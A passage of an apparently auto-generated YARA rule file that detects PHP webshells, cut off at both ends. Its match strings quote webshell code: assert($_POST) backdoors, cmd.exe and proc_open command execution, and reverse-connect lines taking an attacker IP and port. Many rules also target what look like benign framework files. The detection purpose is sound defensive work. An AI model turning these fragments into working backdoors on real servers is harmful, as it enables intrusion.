      $s1 = "<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RequirementsClassBeforeClassHookTest
{
   meta:
      description = "php22 - file RequirementsClassBeforeClassHookTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c6600af37dd27bf9ee071950048e4c18fee31d228be007350656ef3a61be720a"
   strings:
      $s1 = "* @requires extension nonExistingExtension" fullword ascii
      $s2 = "throw new Exception(__METHOD__ . ' should not be called because of class requirements.');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PhpMailerExceptionHandler
{
   meta:
      description = "php22 - file PhpMailerExceptionHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d653dba27d43a859b526f31045ab1e3ea0391835be04cdfb4a7e47c4634cc7d"
   strings:
      $x1 = "* @license   https://github.com/userfrosting/UserFrosting/blob/master/licenses/UserFrosting.md (MIT License)" fullword ascii
      $x2 = "* @author Alex Weissman (https://alexanderweissman.com)" fullword ascii
      $x3 = "* UserFrosting (http://www.userfrosting.com)" fullword ascii
      $s4 = "* @link      https://github.com/userfrosting/UserFrosting" fullword ascii
      $s5 = "* Resolve a list of error messages to present to the end user." fullword ascii
      $s6 = "* Handler for phpMailer exceptions." fullword ascii
      $s7 = "use UserFrosting\\Support\\Message\\UserMessage;" fullword ascii
      $s8 = "namespace UserFrosting\\Sprinkle\\Core\\Error\\Handler;" fullword ascii
      $s9 = "new UserMessage(\"ERROR.MAIL\")" fullword ascii
      $s10 = "protected function determineUserMessages()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule ProductsToCodesTransformer
{
   meta:
      description = "php22 - file ProductsToCodesTransformer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4acf6efc01049f8f096848782f370c234bcf742f6ee83ce6214442eb1d5a82cb"
   strings:
      $s1 = "* @param ProductRepositoryInterface $productRepository" fullword ascii
      $s2 = "* @var ProductRepositoryInterface" fullword ascii
      $s3 = "use Sylius\\Component\\Core\\Repository\\ProductRepositoryInterface;" fullword ascii
      $s4 = "return new ArrayCollection($this->productRepository->findBy(['code' => $value]));" fullword ascii
      $s5 = "$productCodes[] = $product->getCode();" fullword ascii
      $s6 = "public function __construct(ProductRepositoryInterface $productRepository)" fullword ascii
      $s7 = "use Sylius\\Component\\Core\\Model\\ProductInterface;" fullword ascii
      $s8 = "use Doctrine\\Common\\Collections\\ArrayCollection;" fullword ascii
      $s9 = "use Symfony\\Component\\Form\\DataTransformerInterface;" fullword ascii
      $s10 = "use Doctrine\\Common\\Collections\\Collection;" fullword ascii
      $s11 = "/** @var ProductInterface $product */" fullword ascii
      $s12 = "namespace Sylius\\Bundle\\CoreBundle\\Form\\DataTransformer;" fullword ascii
      $s13 = "public function transform($value): Collection" fullword ascii
      $s14 = "public function reverseTransform($products): array" fullword ascii
      $s15 = "private $productRepository;" fullword ascii
      $s16 = "$this->productRepository = $productRepository;" fullword ascii
      $s17 = "final class ProductsToCodesTransformer implements DataTransformerInterface" fullword ascii
      $s18 = "Assert::isInstanceOf($products, Collection::class);" fullword ascii
      $s19 = "foreach ($products as $product) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule php22_PHPSPY
{
   meta:
      description = "php22 - file PHPSPY.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e349d8a219a43f3dd1339ec5ca39764956401f3820b5000fe25ff18845edff29"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));" fullword ascii
      $x3 = "echo\"Help?? View <A href=\\\"http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006\\\" target=\\\"_blank\\\"" fullword ascii
      $x4 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x5 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x6 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $x7 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $x8 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $x9 = "echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s10 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s11 = "$result = $conn->Execute($_POST['sql_query']);" fullword ascii
      $s12 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s13 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"\".$ck.\"_Files.zip\");" fullword ascii
      $s14 = "$url= \"http://data.alexa.com/data?cli=10&dat=snba&url=\".$_SERVER['HTTP_HOST'];" fullword ascii
      $s15 = "$shell = \"select 0x\".$mysql.\" from \".$database.\" into DUMPFILE '\".$uppath.\"/\".$upname.\"';\";" fullword ascii
      $s16 = "<span style=\"font-size: 11px; font-family: Verdana\">PassWord: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s17 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s18 = "$header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilen" fullword ascii
      $s19 = "$tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;" fullword ascii
      $s20 = ":'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule PodsUpgrade_2_0_0
{
   meta:
      description = "php22 - file PodsUpgrade_2_0_0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6541f5a416c5654d0d72f8ac59eb949e8b01fe35de5289671ffac7a8f2a495aa"
   strings:
      $s1 = "$errors[] = \"<strong>{$field}</strong> \" . __( 'is a field in this pod, but was not found in the table - the fie" fullword ascii
      $s2 = "$errors[] = \"<strong>{$column}</strong> \" . __( 'is a field in the table, but was not found in this pod - the fi" fullword ascii
      $s3 = "$new_sister_id = pods_query( \"SELECT `post_id` FROM `@wp_postmeta` WHERE `meta_key` = '_pods_1x_field_id' AND `m" fullword ascii
      $s4 = "$new_field_id = pods_query( \"SELECT `post_id` FROM `@wp_postmeta` WHERE `meta_key` = '_pods_1x_field_id' AND `meta_v" fullword ascii
      $s5 = "$templates = pods_query( \"SELECT * FROM `@wp_pod_templates`\", false );" fullword ascii
      $s6 = "return pods_error( __( 'Input Helpers may not function in our new forms, we have imported and disabled them for your" fullword ascii
      $s7 = "$field_rows = pods_query( \"SELECT * FROM `@wp_pod_fields` WHERE `datatype` = {$pod_type->id} ORDER BY `weight`, `name`\" );" fullword ascii
      $s8 = "pods_query( \"DELETE FROM `@wp_postmeta` WHERE `meta_key` LIKE '_pods_1x_%'\" );" fullword ascii
      $s9 = "$field_rows = pods_query( \"SELECT * FROM `@wp_pod_fields` WHERE `datatype` = {$pod_type->id} ORDER BY `weight`, " fullword ascii
      $s10 = "delete_option( 'pods_upload_require_login' );" fullword ascii
      $s11 = "$sister_ids = (array) get_option( 'pods_framework_upgrade_2_0_sister_ids', array() );" fullword ascii
      $s12 = "if ( !in_array( $field[ 'name' ], array( 'created', 'modified', 'author' ) ) && !in_array( $field[ 'type' ], array( " fullword ascii
      $s13 = "$count = pods_query( \"SELECT COUNT(*) AS `count` FROM `@wp_pod_templates`\", false );" fullword ascii
      $s14 = "return pods_error( sprintf( __( 'Pod <strong>%s</strong> not found, items cannot be migrated', 'pods' ), $pod ) );" fullword ascii
      $s15 = "if ( false !== apply_filters( 'pods_update_run', null, PODS_VERSION, $old_version ) )" fullword ascii
      $s16 = "delete_option( 'pods_files_require_login' );" fullword ascii
      $s17 = "$wp_roles = get_option( \"{$wpdb->prefix}user_roles\" );" fullword ascii
      $s18 = "$field_rows = pods_query( \"SELECT `id`, `name`, `coltype` FROM `@wp_pod_fields` WHERE `datatype` = {$pod_type} ORDER BY " fullword ascii
      $s19 = "if ( !in_array( \"{$wpdb->prefix}pod_templates\", $this->tables ) )" fullword ascii
      $s20 = "do_action( 'pods_update_post', PODS_VERSION, $old_version );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule php452244651
{
   meta:
      description = "php22 - file php452244651.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d613a14f8b56c8f858273185508e7d78f7866f0061be241e9bcf04f7896022b"
   strings:
      $s1 = "<?php echo$_SERVER['SERVER_NAME']?>(<?php echo@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>" fullword ascii
      $s2 = "if ($_GET[pass]==$password){" fullword ascii
      $s3 = ":<input type=\"text\" name=\"lujing\" id=\"lujing\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"];?>' />" fullword ascii
      $s4 = "$password=\"keio\";/**" fullword ascii
      $s5 = "#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}" fullword ascii
      $s6 = "if(fwrite($fo,$_POST[\"neirong\"]))" fullword ascii
      $s7 = "$fo=fopen($_POST[\"lujing\"],\"w\");" fullword ascii
      $s8 = ":<?php  echo $_SERVER[\"SCRIPT_FILENAME\"]?>" fullword ascii
      $s9 = "#neirong{width:558px;height:250px;border=#0000 1px solid}" fullword ascii
      $s10 = "#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}" fullword ascii
      $s11 = "if ($_POST)" fullword ascii
      $s12 = "IP <?php=$_SERVER['SERVER_NAME']?></title>" fullword ascii
      $s13 = "{ echo \"<font color=#33CCFF><b>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 3KB and
      8 of them
}

rule RendererBuilder
{
   meta:
      description = "php22 - file RendererBuilder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "78824f8ff3a6fb09f694bb04897b156c69c2609294b3a9404569f34662385345"
   strings:
      $s1 = "$this->view->setLabel($key->getAttributeKeyDisplayName());" fullword ascii
      $s2 = "use Concrete\\Core\\Entity\\Attribute\\Key\\Key;" fullword ascii
      $s3 = "public function __construct(Key $key, View $view, Renderer $renderer)" fullword ascii
      $s4 = "$this->renderer->renderView($this->view, $this->key);" fullword ascii
      $s5 = "use Concrete\\Core\\Attribute\\Form\\Control\\View\\View;" fullword ascii
      $s6 = "namespace Concrete\\Core\\Attribute\\Form;" fullword ascii
      $s7 = "call_user_func_array([$this->view, $name], $arguments);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule password_blade
{
   meta:
      description = "php22 - file password.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0032569efba27b7ebe0ab8cc954d733df04fcbd3c9b9b5894d30ebbacbeaac6"
   strings:
      $s1 = "Click here to reset your password: {{ url('password/reset/'.$token) }}" fullword ascii
   condition:
      uint16(0) == 0x6c43 and filesize < 1KB and
      all of them
}

rule php22_qiang3
{
   meta:
      description = "php22 - file qiang3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0bde3f330a50bdf3d7c87f2ee9d243630779d3021d0e10d2ed36029154f795f5"
   strings:
      $s1 = "\").($_[+\"\"]|\"\").($_[+\"\"]^\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PDOSqliteTest
{
   meta:
      description = "php22 - file PDOSqliteTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "55957861ea0411048e30bd0430cc3cf8201298025c37dc0942725e5a251aec42"
   strings:
      $s1 = "public $driver = 'sqlite';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule PhpDumper
{
   meta:
      description = "php22 - file PhpDumper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d41c9ca83ffe16924d837ef8f3285df1370d7f2080d3f03c42264b1fb446f779"
   strings:
      $x1 = "throw new RuntimeException('Unable to dump a service container if a parameter is an object or a resource.');" fullword ascii
      $x2 = "if (!preg_match(\"/\\\\\\$this->(?:getEnv\\('(?:\\w++:)*+\\w++'\\)|targetDirs\\[\\d++\\])/\", $dumpedValue)) {" fullword ascii
      $x3 = "use Symfony\\Component\\DependencyInjection\\Exception\\ServiceCircularReferenceException;" fullword ascii
      $x4 = "throw new LogicException('You cannot compile a dumped container that was already compiled.');" fullword ascii
      $x5 = "throw new RuntimeException(sprintf('Cannot dump definition: The \"%s\" service is defined to be created by" fullword ascii
      $x6 = "$code .= $this->getProxyDumper()->getProxyFactoryCode($definition, $id, sprintf($factoryCode, $methodName));" fullword ascii
      $x7 = "throw new RuntimeException(sprintf('Cannot dump definition because of invalid factory method (%s)', $callable[1] ?: 'n/a'));" fullword ascii
      $x8 = "throw new RuntimeException(sprintf('Cannot dump definition because of invalid factory method (%s)', $factory[1] ?: 'n/a'));" fullword ascii
      $x9 = "if ($service->isLazy() && !$this->getProxyDumper() instanceof NullDumper) {" fullword ascii
      $x10 = "throw new RuntimeException(sprintf('Cannot dump definition because of invalid class name (%s)', $class ?: 'n/a'));" fullword ascii
      $x11 = "* Sets the dumper to be used when dumping proxies in the generated container." fullword ascii
      $x12 = "use Symfony\\Component\\DependencyInjection\\Compiler\\AnalyzeServiceReferencesPass;" fullword ascii
      $x13 = "* by the Symfony Dependency Injection Component." fullword ascii
      $x14 = "throw new RuntimeException(sprintf('Cannot dump definition because of invalid factory method (%s)', $callabl" fullword ascii
      $x15 = "throw new RuntimeException(sprintf('Cannot dump definition because of invalid factory method (%s)', $fac" fullword ascii
      $s16 = "use Symfony\\Component\\DependencyInjection\\LazyProxy\\PhpDumper\\DumperInterface as ProxyDumper;" fullword ascii
      $s17 = "* Retrieves the currently set proxy dumper or instantiates one." fullword ascii
      $s18 = "$code = sprintf('$this->get(\\'%s\\', /* ContainerInterface::NULL_ON_INVALID_REFERENCE */ %d)', $id, ContainerInterfac" fullword ascii
      $s19 = "* @throws ServiceCircularReferenceException when the container contains a circular reference" fullword ascii
      $s20 = "* @author Johannes M. Schmitt <schmittjoh@gmail.com>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule resend_validation
{
   meta:
      description = "php22 - file resend_validation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61f18e40ea047f6440e1c0810a84152d1caa148eff97a41a89c0888df69e563a"
   strings:
      $s1 = "* Resends validation emails to a user or users by guid" fullword ascii
      $s2 = "return elgg_error_response(elgg_echo('uservalidationbyemail:errors:unknown_users'));" fullword ascii
      $s3 = "$error_txt = elgg_echo('uservalidationbyemail:errors:could_not_resend_validations');" fullword ascii
      $s4 = "$error_txt = elgg_echo('uservalidationbyemail:errors:could_not_resend_validation');" fullword ascii
      $s5 = "if ($user->isValidated() !== false || !uservalidationbyemail_request_validation($guid)) {" fullword ascii
      $s6 = "// don't resend emails to validated users" fullword ascii
      $s7 = "$user_guids = (array) get_input('user_guids');" fullword ascii
      $s8 = "$message_txt = elgg_echo('uservalidationbyemail:messages:resent_validations');" fullword ascii
      $s9 = "$message_txt = elgg_echo('uservalidationbyemail:messages:resent_validation');" fullword ascii
      $s10 = "$user = get_user($guid);" fullword ascii
      $s11 = "return elgg_error_response($error_txt);" fullword ascii
      $s12 = "foreach ($user_guids as $guid) {" fullword ascii
      $s13 = "if (count($user_guids) == 1) {" fullword ascii
      $s14 = "return elgg_ok_response('', $message_txt);" fullword ascii
      $s15 = "if (!$user_guids) {" fullword ascii
      $s16 = "$access = access_show_hidden_entities(true);" fullword ascii
      $s17 = "access_show_hidden_entities($access);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_picconf
{
   meta:
      description = "php22 - file picconf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "828e13e143dc50bcde769128772066e303c7fdb10da81f9b6090978e9b4fbb82"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "$res = execute(which('python').\" /tmp/angel_bcpy $yourip $yourport &\");" fullword ascii
      $x4 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $x6 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x7 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x8 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $x9 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s10 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s11 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s12 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s13 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s14 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s15 = "echo(execute($command));" fullword ascii
      $s16 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s17 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s18 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s19 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s20 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule plugin_m
{
   meta:
      description = "php22 - file plugin_m.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6951d5435e2532684e5fc6d3c4d94c5ebe633acbd7d0105cdab643ecde0df587"
   strings:
      $s1 = "<?php @assert($_POST['cmd']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule password
{
   meta:
      description = "php22 - file password.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "912fadf335e4d6413a00681b9cc2593ebbbb9906f1611a23110c19762717e54e"
   strings:
      $s1 = "* This is a compatibility file for password_hash and password_verify for" fullword ascii
      $s2 = "* php systems prior to 5.5 that do not have password hashing built-in." fullword ascii
      $s3 = "* @returns string|false The hashed password, or false on error." fullword ascii
      $s4 = "trigger_error(\"Crypt must be loaded for password_create to function\", E_USER_WARNING);" fullword ascii
      $s5 = "if (!function_exists('password_get_info')) {" fullword ascii
      $s6 = "* This will export these two functions to the global namespace" fullword ascii
      $s7 = "defined('PASSWORD_DEFAULT') or define('PASSWORD_DEFAULT', PASSWORD_BCRYPT);" fullword ascii
      $s8 = "trigger_error(sprintf(\"Length cannot be less than or equal zero: %d\", $length), E_USER_WARNING);" fullword ascii
      $s9 = "$buffer .= fread($f, $raw_length - $read);" fullword ascii
      $s10 = "defined('PASSWORD_BCRYPT') or define('PASSWORD_BCRYPT', 1);" fullword ascii
      $s11 = "function password_hash($password, $algo, $options = array()) {" fullword ascii
      $s12 = "if (!function_exists('password_needs_rehash')) {" fullword ascii
      $s13 = "$salt = __password_make_salt($required_salt_len);" fullword ascii
      $s14 = "trigger_error(sprintf(\"password_hash(): Provided salt is too short: %d expecting %d\", strlen($salt), $required_salt_len), E_US" ascii
      $s15 = "function __password_make_salt($length) {" fullword ascii
      $s16 = "if (!function_exists('password_hash')) {" fullword ascii
      $s17 = "if (!function_exists('password_verify')) {" fullword ascii
      $s18 = "* DO NOT USE THIS FUNCTION DIRECTLY" fullword ascii
      $s19 = "* Function to make a salt" fullword ascii
      $s20 = "if (!is_string($ret) || strlen($ret) != strlen($hash)) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule Priv9CgiVip
{
   meta:
      description = "php22 - file Priv9CgiVip.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27f7a6a01ee1aa39a026edb690aa9c8a161eec51b8aabb090703353848d312d5"
   strings:
      $x1 = "<?php ${\"\\x47\\x4cO\\x42\\x41\\x4cS\"}[\"\\x70\\x6amg\\x62\\x78\\x64\\x79\\x62\\x75\"]=\"p\\x79\\x74h\\x6f\\x6e\\x70\";${\"G" ascii
      $s2 = "2\\x3d\\\"#\\x30000\\x30\\x30\\x22></em\\x3e</\\x66o\\x6et>\\x20\\x20\\x20\\x20</tr> \\n\";" fullword ascii
      $s3 = "e=\"f\";${${\"\\x47\\x4c\\x4f\\x42A\\x4cS\"}[\"sa\\x61\\x69\\x76yxo\\x6a\"]}=\"F\\x72o\\x6d:\".$_POST[\"h\\x65a\\x64er\"];${\"" ascii
      $s4 = "\\x2e\\x78\\x79z -\\x20\\x73p\\x79ha\\x63k\\x65rz\\x2ec\\x6fm\\x20\\x20[$site]</titl\\x65\\x3e\\x3c/head\\x3e\";echo\"\\x3c\\x62" ascii
      $s5 = "\"]=\"\\x74\\x64\\x69\\x72\";${${\"GL\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x67w\\x67\\x6eg\\x73oe\\x7a\\x6a\\x68\"]}=$_POST[\"cmd\"];" ascii
      $s6 = "e\\x3e<cen\\x74\\x65r\\x3e<\\x69m\\x67\\x20s\\x72c\\x3d\\\"\\x68ttps://w\\x77\\x77.\\x73p\\x79hac\\x6b\\x65\\x72\\x7a.com/fo\\x7" ascii
      $s7 = "71\\x6c\\x67\\x76\\x79\\x6ch\\x71\"]=\"\\x66\";${${\"GLOBA\\x4c\\x53\"}[\"h\\x66\\x6b\\x78n\\x6fstnd\\x73\"]}=$_POST[\"comm\\x61" ascii
      $s8 = "f\\x6ef\"]}=phpversion();${$lelfenhq}=realpath($_GET[\"\\x63h\\x64i\\x72\"]).\"/\";${\"\\x47L\\x4fB\\x41L\\x53\"}[\"\\x68m\\x63b" ascii
      $s9 = "2\\x72>S\\x6f\\x66t\\x77\\x61r\\x65: \\x3cu>$info\\x3c/\\x75\\x3e\\x3c\\x62r>Ve\\x72\\x73\\x69on : <u>$version</u\\x3e<b\\x72>" ascii
      $s10 = "ujojkdrbgnw=\"f\";${${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"i\\x75g\\x61\\x6ak\"]}=\"\\x74\\x6dp\";${$rrujdjx}=tempnam(${${\"" ascii
      $s11 = "\\x53\"}[\"kfe\\x75\\x71\\x6duk\\x70\\x6e\"]}=ini_get(${${\"\\x47\\x4c\\x4fB\\x41\\x4cS\"}[\"\\x79gzg\\x71\\x6be\\x69\\x73\"]}(1" ascii
      $s12 = "\\x6b\\x22\\x3eP\\x65r\\x6c\\x20\\x73kc\\x69n \\x43gi</\\x61></\\x63en\\x74er\\x3e\";}if(isset($_POST[\"\\x63\\x67i2\"])){${\"" ascii
      $s13 = "\\x6cfa\\x20P\\x79\\x74\\x68on C\\x67i\\x3c/\\x61\\x3e\\x3c/ce\\x6e\\x74\\x65r\\x3e\";}if(isset($_POST[\"\\x63\\x67i\\x36\"])){$" ascii
      $s14 = "\\x74\\x62\"]}=$_GET[\"\\x66d\\x65\\x6c\"];${${\"G\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x6e\\x70\\x68flhij\\x73\"]}=$_POST[\"\\x" ascii
      $s15 = "c\\x6flor\\x3d\\x27#00000\\x30\\x27>Sit\\x65: \\x3cu>$site\\x3c/\\x75><b\\x72>Se\\x72\\x76\\x65\\x72 n\\x61\\x6de:\\x20\\x3cu>$s" ascii
      $s16 = "\\x3c/a\\x3e</c\\x65\\x6et\\x65\\x72>\";}if(isset($_POST[\"\\x77so\"])){mkdir(\"\\x77\\x73\\x6f\");${\"\\x47\\x4c\\x4f\\x42AL\\x" ascii
      $s17 = "x72\\x3e\\x44is\\x61\\x62\\x6ce F\\x75\\x6e\\x63\\x74ions:\\x20\\x3cu>$dis</u\\x3e\\x3c\\x62r\\x3eP\\x61ge:\\x20\\x3cu>$page\\x3" ascii
      $s18 = ".${$bjpcjqnnpz}(110));${${\"\\x47\\x4c\\x4f\\x42\\x41LS\"}[\"\\x7a\\x64w\\x72\\x6af\\x70\\x77hv\"]}=get_defined_functions();${$q" ascii
      $s19 = "x53\\x41\\x39I\\x475v\\x64HByZX\\x4el\\x62\\x6e\\x51KIC\\x41\\x67IC\\x41\\x67ICBl\\x62H\\x4elOg\\x6f\\x67I\\x43Ag\\x49\\x43\\x41" ascii
      $s20 = "x47V\\x6db3\\x4a\\x74L\\x6dd\\x6cd\\x47\\x78p\\x63\\x33\\x51oZ\\x6dll\\x62\\x47QpC\\x69AgIC\\x41\\x67\\x49C\\x41\\x67I\\x43AgI" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule PrintpageControllerBase
{
   meta:
      description = "php22 - file PrintpageControllerBase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "90d45435415b8c03076565251cf67f98f86eca542256e33f8917f438089582d8"
   strings:
      $x1 = "file_put_contents(PIMCORE_SYSTEM_TEMP_DIRECTORY . DIRECTORY_SEPARATOR . 'web2print-processingoptions-' . $documentId . '" fullword ascii
      $x2 = "file_put_contents(PIMCORE_SYSTEM_TEMP_DIRECTORY . DIRECTORY_SEPARATOR . 'web2print-processingoptions-' . $documentId . '_' . $th" ascii
      $x3 = "$filename = PIMCORE_SYSTEM_TEMP_DIRECTORY . DIRECTORY_SEPARATOR . 'web2print-processingoptions-' . $documentId . '_' . $" fullword ascii
      $s4 = "$filename = PIMCORE_SYSTEM_TEMP_DIRECTORY . DIRECTORY_SEPARATOR . 'web2print-processingoptions-' . $documentId . '_' . $this->ge" ascii
      $s5 = "* @Route(\"/get-processing-options\")" fullword ascii
      $s6 = "private function getStoredProcessingOptions($documentId)" fullword ascii
      $s7 = "$statusUpdate = Processor::getInstance()->getStatusUpdate($document->getId());" fullword ascii
      $s8 = "$response->setContentDisposition('attachment', $document->getKey() . '.pdf');" fullword ascii
      $s9 = "$allParams['hostName'] = \\Pimcore\\Config::getSystemConfig()->general->domain;" fullword ascii
      $s10 = "$storedValues = $this->getStoredProcessingOptions($request->get('id'));" fullword ascii
      $s11 = "$this->saveProcessingOptions($document->getId(), $allParams);" fullword ascii
      $s12 = "$options = Processor::getInstance()->getProcessingOptions();" fullword ascii
      $s13 = "public function getProcessingOptionsAction(Request $request)" fullword ascii
      $s14 = "* @Route(\"/active-generate-process\")" fullword ascii
      $s15 = "_' . $this->getAdminUser()->getId() . '.psf', \\Pimcore\\Tool\\Serialize::serialize($options));" fullword ascii
      $s16 = "$page->contentMasterDocumentPath = $page->getContentMasterDocument()->getRealFullPath();" fullword ascii
      $s17 = "Processor::getInstance()->cancelGeneration(intval($request->get('id')));" fullword ascii
      $s18 = "private function saveProcessingOptions($documentId, $options)" fullword ascii
      $s19 = "use Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBagInterface;" fullword ascii
      $s20 = "return \\Pimcore\\Tool\\Serialize::unserialize(file_get_contents($filename));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule OrderPricesRecalculator
{
   meta:
      description = "php22 - file OrderPricesRecalculator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "86b80b01d4fe4ea0932890968ac0ecca6e8f180be860c2780939cb74620d0147"
   strings:
      $s1 = "use Sylius\\Component\\Order\\Processor\\OrderProcessorInterface;" fullword ascii
      $s2 = "namespace Sylius\\Component\\Core\\OrderProcessing;" fullword ascii
      $s3 = "public function process(BaseOrderInterface $order): void" fullword ascii
      $s4 = "final class OrderPricesRecalculator implements OrderProcessorInterface" fullword ascii
      $s5 = "* @param ProductVariantPriceCalculatorInterface $productVariantPriceCalculator" fullword ascii
      $s6 = "use Sylius\\Component\\Order\\Model\\OrderInterface as BaseOrderInterface;" fullword ascii
      $s7 = "foreach ($order->getItems() as $item) {" fullword ascii
      $s8 = "$channel = $order->getChannel();" fullword ascii
      $s9 = "use Sylius\\Component\\Core\\Calculator\\ProductVariantPriceCalculatorInterface;" fullword ascii
      $s10 = "* @var ProductVariantPriceCalculatorInterface" fullword ascii
      $s11 = "public function __construct(ProductVariantPriceCalculatorInterface $productVariantPriceCalculator)" fullword ascii
      $s12 = "/** @var OrderInterface $order */" fullword ascii
      $s13 = "$item->getVariant()," fullword ascii
      $s14 = "$this->productVariantPriceCalculator = $productVariantPriceCalculator;" fullword ascii
      $s15 = "$item->setUnitPrice($this->productVariantPriceCalculator->calculate(" fullword ascii
   condition:
